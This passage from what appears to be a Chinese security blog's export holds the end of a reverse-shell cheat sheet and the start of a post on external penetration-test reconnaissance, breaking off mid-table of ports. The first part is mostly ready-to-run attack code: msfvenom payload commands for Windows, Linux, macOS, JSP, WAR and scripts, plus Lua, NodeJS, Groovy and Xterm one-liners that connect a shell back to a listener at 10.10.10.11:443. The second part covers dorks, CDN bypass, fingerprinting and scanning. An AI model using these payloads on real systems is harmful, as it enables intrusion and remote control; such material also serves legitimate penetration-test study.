<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Thread</span> <span class="keyword">thread</span> = <span class="literal">new</span> <span class="keyword">Thread</span>()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="literal">void</span> run()&#123;</span><br><span class="line">        <span class="comment">// Reverse shell here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">thread</span>.start();</span><br></pre></td></tr></table></figure>

<h2 id="生成War文件反弹shell"><a href="#生成War文件反弹shell" class="headerlink" title="生成War文件反弹shell"></a>生成War文件反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>使用如下命令生成war文件：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f war &gt; reverse.war</span><br></pre></td></tr></table></figure>

<p>查看war包中shell的jsp文件名</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">strings <span class="keyword">reverse</span>.war | <span class="keyword">grep</span> jsp</span><br></pre></td></tr></table></figure>

<p>在靶机上部署war包后，访问shell的jsp文件，即可在监听端口获得反弹shell</p>
<h2 id="使用Lua脚本反弹shell"><a href="#使用Lua脚本反弹shell" class="headerlink" title="使用Lua脚本反弹shell"></a>使用Lua脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令： Linux平台：</p>
<figure class="highlight csp"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(<span class="string">&#x27;socket&#x27;</span>);require(<span class="string">&#x27;os&#x27;</span>);t=socket.tcp();t:connect(<span class="string">&#x27;10.10.10.11&#x27;</span>,<span class="string">&#x27;443&#x27;</span>);os.execute(<span class="string">&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;</span>);&quot;</span><br></pre></td></tr></table></figure>

<p>Windows及Linux平台：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">lua5<span class="number">.1</span> -e &#x27;<span class="built_in">local</span> host, port = <span class="string">&quot;10.10.10.11&quot;</span>, <span class="number">443</span> <span class="built_in">local</span> socket = require(<span class="string">&quot;socket&quot;</span>) <span class="built_in">local</span> tcp = socket.tcp() <span class="built_in">local</span> io = require(<span class="string">&quot;io&quot;</span>) tcp:connect(host, port); <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span> <span class="built_in">local</span> cmd, <span class="built_in">status</span>, partial = tcp:receive() <span class="built_in">local</span> f = io.popen(cmd, <span class="string">&quot;r&quot;</span>) <span class="built_in">local</span> s = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>) f:<span class="built_in">close</span>() tcp:send(s) <span class="keyword">if</span> <span class="built_in">status</span> == <span class="string">&quot;closed&quot;</span> <span class="keyword">then</span> <span class="built_in">break</span> end end tcp:<span class="built_in">close</span>()&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="NodeJS版本反弹shell"><a href="#NodeJS版本反弹shell" class="headerlink" title="NodeJS版本反弹shell"></a>NodeJS版本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">443</span>, <span class="string">&quot;10.10.10.11&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>; </span><br><span class="line">&#125;)();</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc -e /bin/sh 10.10.10.11 443&#x27;</span>)</span><br><span class="line">-<span class="keyword">var</span> x = <span class="built_in">global</span>.process.mainModule.require</span><br><span class="line">-x(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc 10.10.10.11 443 -e /bin/bash&#x27;</span>)</span><br><span class="line"><span class="attr">https</span>:<span class="comment">//gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</span></span><br></pre></td></tr></table></figure>

<h2 id="Groovy版本反弹shell"><a href="#Groovy版本反弹shell" class="headerlink" title="Groovy版本反弹shell"></a>Groovy版本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">String</span> host=<span class="string">&quot;10.10.10.11&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">443</span>;</span><br><span class="line"><span class="keyword">String</span> cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line"><span class="built_in">Process</span> p=<span class="keyword">new</span> <span class="built_in">ProcessBuilder</span>(cmd).<span class="built_in">redirectErrorStream</span>(<span class="literal">true</span>).<span class="built_in">start</span>();Socket s=<span class="keyword">new</span> <span class="built_in">Socket</span>(host,port);InputStream pi=p.<span class="built_in">getInputStream</span>(),pe=p.<span class="built_in">getErrorStream</span>(), si=s.<span class="built_in">getInputStream</span>();OutputStream po=p.<span class="built_in">getOutputStream</span>(),so=s.<span class="built_in">getOutputStream</span>();<span class="keyword">while</span>(!s.<span class="built_in">isClosed</span>())&#123;<span class="keyword">while</span>(pi.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pi.<span class="built_in">read</span>());<span class="keyword">while</span>(pe.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pe.<span class="built_in">read</span>());<span class="keyword">while</span>(si.<span class="built_in">available</span>()&gt;<span class="number">0</span>)po.<span class="built_in">write</span>(si.<span class="built_in">read</span>());so.<span class="built_in">flush</span>();po.<span class="built_in">flush</span>();Thread.<span class="built_in">sleep</span>(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.<span class="built_in">exitValue</span>();<span class="keyword">break</span>;&#125;<span class="built_in"><span class="keyword">catch</span></span> (Exception e)&#123;&#125;&#125;;p.<span class="built_in">destroy</span>();s.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure>

<h2 id="生成Meterpreter反弹Shell"><a href="#生成Meterpreter反弹Shell" class="headerlink" title="生成Meterpreter反弹Shell:"></a>生成Meterpreter反弹Shell:</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f exe &gt; reverse.exe</span><br><span class="line">msfvenom -p windows/shell_reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f exe &gt; reverse.exe</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f elf &gt;reverse.elf</span><br><span class="line">msfvenom -p linux/x86/shell_reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f elf &gt;reverse.elf</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f elf &gt; shell.elf</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f exe &gt; shell.exe</span><br><span class="line">msfvenom -p osx/x86/shell_reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f macho &gt; shell.macho</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f asp &gt; shell.asp</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.jsp</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f war &gt; shell.war</span><br><span class="line">msfvenom -p cmd/unix/reverse_python <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.py</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.sh</span><br><span class="line">msfvenom -p cmd/unix/reverse_perl <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.pl</span><br></pre></td></tr></table></figure>

<h2 id="使用Xterm反弹shell"><a href="#使用Xterm反弹shell" class="headerlink" title="使用Xterm反弹shell"></a>使用Xterm反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">xterm</span> -display <span class="number">10.10.10.11:1</span></span><br><span class="line"><span class="attribute">Xnest</span> :<span class="number">1</span></span><br><span class="line"><span class="attribute">xhost</span> +targetip</span><br></pre></td></tr></table></figure>

<h2 id="获取TTY"><a href="#获取TTY" class="headerlink" title="获取TTY"></a>获取TTY</h2><p>python</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/xuanhusec/OscpStudyGroup/blob/master/0x0004-%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB.md">https://github.com/xuanhusec/OscpStudyGroup/blob/master/0x0004-%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB.md</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>外网渗透信息收集</title>
    <url>/2022/02/10/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p><strong>什么是信息搜集？</strong></p>
<p>信息搜集也称踩点，信息搜集毋庸置疑就是尽可能的搜集目标的信息，包括端口信息、DNS信息、员工邮箱等等看似并不起眼的一些信息都算是信息搜集，这些看似微乎其微的信息，对于渗透测试而言就关乎到成功与否了。</p>
<span id="more"></span>

<p><strong>信息搜集的重要性</strong></p>
<p>信息搜集是渗透测试的最重要的阶段，占据整个渗透测试的60%，可见信息搜集的重要性。根据收集的有用信息，可以大大提高我们渗透测试的成功率。</p>
<p><strong>信息搜集的分类</strong></p>
<table>
<thead>
<tr>
<th>主动式信息搜集（可获取到的信息较多，但易被目标发现）</th>
</tr>
</thead>
<tbody><tr>
<td>通过直接发起与被测目标网络之间的互动来获取相关信息，如通过Nmap扫描目标系统。</td>
</tr>
<tr>
<td>被动式信息搜集（搜集到的信息较少，但不易被发现）</td>
</tr>
<tr>
<td>通过第三方服务来获取目标网络相关信息。如通过搜索引擎方式来搜集信息。</td>
</tr>
</tbody></table>
<h1 id="二、搜索引擎"><a href="#二、搜索引擎" class="headerlink" title="二、搜索引擎"></a>二、搜索引擎</h1><table>
<thead>
<tr>
<th>Google hacking</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>fofa</td>
<td><a href="https://fofa.so/">https://fofa.so/</a></td>
</tr>
<tr>
<td>shodan—用来搜索网络空间中在线设备</td>
<td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td>
</tr>
<tr>
<td>zoomeye—针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息</td>
<td><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></td>
</tr>
</tbody></table>
<p><strong>Google hacking——常用搜索语法：</strong></p>
<table>
<thead>
<tr>
<th>intitle:KEYWORD</th>
<th>搜索网页标题中含有关键词的网页</th>
</tr>
</thead>
<tbody><tr>
<td>intext:KEYWORD</td>
<td>搜索站点正文中含有关键词的网页</td>
</tr>
<tr>
<td>inurl:KEYWORD</td>
<td>搜索URL中包含有指定字符串的网址</td>
</tr>
<tr>
<td>inurl:php?id=</td>
<td>搜索PHP网页</td>
</tr>
<tr>
<td>site:DOMAIN</td>
<td>在指定站点内查找相关的内容</td>
</tr>
<tr>
<td>filetype:FILE</td>
<td>搜索指定类型的文件</td>
</tr>
</tbody></table>
<p><strong>我们可以同时附加多个条件进行筛选，比如 inurl:admin intitle:农具<br>两个筛选条件之间用空格隔开</strong></p>
<p><strong>fofa|shodan|zoomeye——搜索语法</strong></p>
<table>
<thead>
<tr>
<th>app:nginx</th>
<th>组件名</th>
</tr>
</thead>
<tbody><tr>
<td>ver:1.0</td>
<td>版本</td>
</tr>
<tr>
<td>os:windows</td>
<td>操作系统</td>
</tr>
<tr>
<td>country:”China”</td>
<td>国家</td>
</tr>
<tr>
<td>city:”guangzhou”</td>
<td>城市</td>
</tr>
<tr>
<td>port:80</td>
<td>端口</td>
</tr>
<tr>
<td>hostname:google</td>
<td>主机名</td>
</tr>
<tr>
<td>site:thief.one</td>
<td>网站域名</td>
</tr>
<tr>
<td>desc:nmask</td>
<td>描述</td>
</tr>
<tr>
<td>keywords:nmask’blog</td>
<td>关键词</td>
</tr>
<tr>
<td>service:ftp</td>
<td>服务类型</td>
</tr>
<tr>
<td>ip:8.8.8.8</td>
<td>ip地址</td>
</tr>
<tr>
<td>cidr:8.8.8.8/24</td>
<td>ip地址段</td>
</tr>
</tbody></table>
<p>通过以上不同种类的搜索引擎我们可以获得相当多的有用的信息，甚至平时搜索东西我们也可以通过zoomeye来找到自己想要的东西</p>
<h1 id="三、企业信息"><a href="#三、企业信息" class="headerlink" title="三、企业信息"></a>三、企业信息</h1><table>
<thead>
<tr>
<th>天眼查</th>
<th align="center">能根据用户的不同需求，实现了企业背景、企业发展、司法风险、经营风险、经营状况、知识产权方面等多种数据维度的检索，例如：企业信用信息公示系统，工业和信息化部ICP/IP地址/域名信息备案管理系统等以上几个可以用来深入了解渗透目标网站所属企业的相关信息</th>
<th><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></th>
</tr>
</thead>
<tbody><tr>
<td>爱企查</td>
<td align="center"><em>爱企查</em>是百度推出的企业信用查询工具,提供一站式的企业信息实时查询,企业相关的工商信息查询,股东查询,主要成员查询,变更记录查询,网站备案查询,对外投资查询,分支机构查询,年报查询,风险警示查询等</td>
<td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td>
</tr>
<tr>
<td>企查查</td>
<td align="center"><em>企查查</em>信息来自国家企业信用信息公示系统,提供企业信息查询,工商查询,企业信用评价查询,企业纠纷查询,企业现金流查询,企业股权查询,企业负债查询,企业资产查询,企业财报查询,公司查询等相关信息</td>
<td><a href="https://www.qcc.com/">https://www.qcc.com/</a></td>
</tr>
<tr>
<td>kali下的whois</td>
<td align="center"></td>
<td></td>
</tr>
<tr>
<td>ICP备案查询网</td>
<td align="center"></td>
<td></td>
</tr>
</tbody></table>
<h1 id="四、域名信息收集"><a href="#四、域名信息收集" class="headerlink" title="四、域名信息收集"></a>四、域名信息收集</h1><p>当我们确定了要渗透的目标，也就是知道了其域名，接下来我们需要收集域名对应的 ip，域名的whois信息、子域名等等一系列与域名相关的信息。</p>
<p>判断域名对应的IP：首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a> 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。那么如何绕过CDN查找网站真实的ip地址呢？传送门——&gt; 绕过CDN查找网站真实ip</p>
<p>域名的whois信息：</p>
<p>通常，我们进行whois查询是去： 站长之家whois查询 。然后查出来信息之后，可以根据查询出来的邮箱、注册人、公司、电话等进行反查。</p>
<p>子域名、DNS记录查询：传送门——&gt; 子域名查询、DNS记录查询</p>
<p>公司敏感信息网上搜集<br>当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。传送门——&gt; Github搜索语法</p>
<h1 id="五、whois信息"><a href="#五、whois信息" class="headerlink" title="五、whois信息"></a>五、whois信息</h1><p>whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。<br>whois信息可以获取关键注册人的信息，包括注册商、联系人、联系邮箱、联系电话、创建时间等,可以进行邮箱反查域名，爆破邮箱，社工，域名劫持，寻找旁站等等。<br><strong>常用的工具有：</strong>站长工具，爱站，微步在线</p>
<h1 id="六、-Nslookup"><a href="#六、-Nslookup" class="headerlink" title="六、 Nslookup"></a>六、 Nslookup</h1><p>1.设置类型为ns</p>
<p>2.下面的例子查询baidu.com使用的DNS服务器名称:</p>
<p>3.下面的例子展示如何查询baidu.com的邮件交换记录：</p>
<p>4.查看网站cname值。</p>
<p>5.查看邮件服务器记录（-qt=MX）</p>
<p>6.同样nslookup也可以验证是否存在域传送漏洞，步骤如下：</p>
<p>nslookup进入交互式模式<br>Server 设置使用的DNS服务器<br>ls命令列出某个域中的所有域名</p>
<h1 id="七、子域名收集"><a href="#七、子域名收集" class="headerlink" title="七、子域名收集"></a>七、子域名收集</h1><p>子域名收集可以发现更多渗透测试范围内的域名/子域名，以增加漏洞发现机率；探测到更多隐藏或遗忘的应用服务，这些应用往往可导致一些严重漏洞。<br>常用的工具有：子域名挖掘机Layer、subDomainsBrute、Dnsenum、Dnsmap …</p>
<p>这里推荐一个在线收集子域名的网站 <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a> 但是可能会出现遇到泛解析防御机制的情况</p>
<h1 id="八、真实IP获取"><a href="#八、真实IP获取" class="headerlink" title="八、真实IP获取"></a>八、真实IP获取</h1><p>现在大多数的网站都开启了CDN加速，导致我们获取到的IP地址不一定是真实的IP地址。</p>
<p><strong>什么是CDN呢？</strong></p>
<p>CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。<br>如果想获取真实IP，我们可以使用以下几种方法<br>1.多地Ping法：由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN。这里推荐一个网站可以多个地点ping服务器，<a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></p>
<p>2.二级域名法：目标站点一般不会把所有的二级域名放cdn上。通过在线工具如站长帮手，收集子域名，确定了没使用CDN的二级域名后。本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。</p>
<p>3.nslookup法：找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。</p>
<p>4.Ping法：直接ping example.com而不是<a href="http://www.example.com,因为现有很多cdn厂商基本只要求把www.example.com/">www.example.com，因为现有很多CDN厂商基本只要求把www.example.com</a> cname到CDN主服务器上去，那么直接ping example.com有可能直接获得真实IP。</p>
<p>5.在线资源：</p>
<ol>
<li><a href="https://wepcc.com/">全球Ping在线测试</a></li>
<li><a href="http://ping.chinaz.com/">站长工具-ping测试</a></li>
<li><a href="https://asm.ca.com/en/ping.php">CA</a></li>
<li><a href="https://dnsdumpster.com/">DNSDumpster</a></li>
<li><a href="https://ipchaxun.com/">IP查询</a></li>
<li><a href="https://viewdns.info/iphistory/">IPhistory</a></li>
<li><a href="https://securitytrails.com/">securitytrails</a></li>
<li><a href="https://sitereport.netcraft.com/">netcraft</a></li>
<li><a href="https://www.17ce.com/">17CE</a></li>
<li><strong>kali下的nslookup、dig</strong></li>
</ol>
<h1 id="九、指纹识别"><a href="#九、指纹识别" class="headerlink" title="九、指纹识别"></a>九、指纹识别</h1><p>通过识别目标网站所使用的操作系统、CMS、服务器与中间件信息，可以帮助我们进一步了解渗透测试环境，可以利用已知的一些CMS漏洞或中间件漏洞来进行攻击。在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。</p>
<p>常见的网站指纹识别工具有：whatweb等。</p>
<p>在线指纹识别网站：</p>
<p>BugScaner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br>云悉指纹：<a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a><br>WhatWeb：<a href="https://whatweb.net/">https://whatweb.net/</a><br>整站分析</p>
<p>可以在以下地方获取信息：<br>1.指定路径下指定名称的js文件或代码。</p>
<p>2.指定路径下指定名称的css文件或代码。</p>
<p>5.display:none中的版权信息。</p>
<p>6.页面底部版权信息，关键字© Powered by等。</p>
<p>7.readme.txt、License.txt、help.txt等文件。</p>
<p>8.指定路径下指定图片文件，如一些小的图标文件，后台登录页面中的图标文件<br>等，一般管理员不会修改它们。</p>
<p>9.注释掉的html代码中&lt;!–</p>
<p>10.http头的X-Powered-By中的值，有的应用程序框架会在此值输出。</p>
<p>11.cookie中的关键字</p>
<p>12.robots.txt文件中的关键字，robots.txt 中禁止的路径很可能说明站点就有这些路径 而且robots.txt 多是可访问的</p>
<p>13.404页面</p>
<p>14.302返回时的旗标</p>
<h1 id="十、服务器类型-Linux-Windows"><a href="#十、服务器类型-Linux-Windows" class="headerlink" title="十、服务器类型(Linux/Windows)"></a>十、服务器类型(Linux/Windows)</h1><p>服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。</p>
<p>判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的，有些windows服务器的TTL值也是几十，而且有的服务器禁止ping。</p>
<p>而判断目标网站服务器的具体的版本的话，可以采用 <a href="https://so.csdn.net/so/search?q=nmap&spm=1001.2101.3001.7020">nmap</a> 进行扫描， -O 和 -A 参数都能扫描出来</p>
<p>通过大小写判断</p>
<p>访问网站：<br><a href="http://www.xxx.com/index.html">http://www.xxx.com/index.html</a><br><a href="http://www.xxx.com/inDex.html">http://www.xxx.com/inDex.html</a><br>Windows操作系统不区分大小写，Linux系统大小写敏感，用此方法能够判断是Windows还是Linux系统。</p>
<p>工具 ：云悉指纹、Whatweb、httprint、Bugscanner、浏览器插件 wappalyzer</p>
<p>有的时候HTTP返回报文的server也可能泄露相关信息</p>
<h1 id="十一、网站容器（Apache-Nginx-Tomcat-IIS）"><a href="#十一、网站容器（Apache-Nginx-Tomcat-IIS）" class="headerlink" title="十一、网站容器（Apache/Nginx/Tomcat/IIS）"></a>十一、网站容器（Apache/Nginx/Tomcat/IIS）</h1><p>知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</p>
<h1 id="十二、脚本类型-php-jsp-asp-aspx"><a href="#十二、脚本类型-php-jsp-asp-aspx" class="headerlink" title="十二、脚本类型(php/jsp/asp/aspx)"></a>十二、脚本类型(php/jsp/asp/aspx)</h1><p>我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。</p>
<p>1：可以根据网站URL来判断</p>
<p>2：site:xxx filetype:php</p>
<p>3：可以根据Firefox的插件来判断</p>
<h1 id="十三、数据库类型-Mysql-Oracle-Accees-Mqlserver"><a href="#十三、数据库类型-Mysql-Oracle-Accees-Mqlserver" class="headerlink" title="十三、数据库类型(Mysql/Oracle/Accees/Mqlserver)"></a>十三、数据库类型(Mysql/Oracle/Accees/Mqlserver)</h1><p>我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的。</p>
<p>几种数据库的区别：</p>
<ol>
<li>Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb 一般是asp的网页文件用access数据库</li>
<li>SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf</li>
<li>MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306</li>
<li>Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521</li>
</ol>
<p>access是不要钱的，access支持千以内的访问量，access是小型数据库</p>
<p>mysql也是开源的，mysql 是中小型数据库</p>
<p>sql server 是收费的一般也就几千，sql server支持几千到上万的访问，sql server是中型数据库</p>
<p>Oracle的费用则数万，Oracle则支持海量的访 问，Oracle是大型数据库</p>
<p>常见搭配：</p>
<p>ASP 和 ASPX：ACCESS、SQL Server<br>PHP：MySQL、PostgreSQL<br>JSP：Oracle、MySQL<br>主机扫描(Nessus)<br>对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。</p>
<p>主机扫描的工具也有很多，比如：Nessus</p>
<h1 id="十四、端口扫描"><a href="#十四、端口扫描" class="headerlink" title="十四、端口扫描"></a>十四、端口扫描</h1><p>扫描端口可以使用Nmap，masscan进行扫描探测，尽可能多的搜集开启的端口好已经对应的服务版本，得到确切的服务版本后可以搜索有没有对应版本的漏洞。<br>常见的端口信息及渗透方法：</p>
<table>
<thead>
<tr>
<th>端口</th>
<th>服务</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>tcp 20,21</td>
<td>FTP</td>
